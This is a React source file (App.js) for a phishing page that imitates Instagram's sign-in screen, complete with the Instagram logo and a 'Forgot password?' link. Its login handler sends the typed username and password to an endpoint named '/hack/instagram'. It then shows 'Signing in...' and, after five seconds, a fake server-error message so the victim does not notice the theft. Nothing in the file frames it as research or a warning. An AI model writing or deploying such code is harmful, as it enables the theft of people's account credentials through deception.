import { useState } from 'react';
import logo from './logo.svg';
import './App.css';
import instagramLogo from './instagram-logo-white.webp';

function App() {

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [secondScreen, setSecondScreen] = useState(false);

  const handleLogin = async (e) => {

    e.preventDefault();

    await fetch('http://localhost:3001/hack/instagram', {
      method: 'POST',
      headers: {
        "Content-Type": "application/json"
      }, 
      body: JSON.stringify({
        username: username,
        password: password
      })
    }).then(() => {
      setSecondScreen(true);

      setTimeout(() => {
        setIsLoading(true);
      }, 5000)
    });
  }

  if (isLoading) {
    return (
        <div className="App">
          <h3 style={{ fontFamily: "helveticaNeue" }}>
            Try Again Later
          </h3>
          <p style={{ fontFamily: "helveticaNeue" }}>
            Our servers are having issues and cannot connect right now. We are working to get them back up as soon as possible
          </p>
        </div>
    );
  } else {
    return (
        <div className="App">
          {secondScreen ?
          <>
          <p style={{ fontFamily: "helveticaNeue" }}> 
            Signing in...
          </p>
          </>
          :
          <>
          <h2 style={{ fontFamily: "helveticaNeue" }}>
            Sign in to continue
          </h2>
          <img src={instagramLogo} style={{ height: '9em', width: '9em', marginBottom: '2em' }} />
          <input className='inputBox' placeholder='Phone number, username, or email' style={{ fontFamily: "helveticaNeue" }} 
            onChange={e => setUsername(e.target.value)} />
          <input className='inputBox' placeholder='password' style={{ fontFamily: "helveticaNeue" }} 
            onChange={e => setPassword(e.target.value)} type="password" />
          <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'flex-end', width: '70%'}} >
            <p style={{ fontFamily: "helveticaNeue", color: "#568eba", fontSize: ".6em" }}>
              Forgot password?
            </p>
          </div>
          <button className='loginBtn' style={{ fontFamily: "helveticaNeue" }} onClick={handleLogin}> 
            Log In
          </button>
          </>
          }
      </div>
  );
  }


}

export default App;
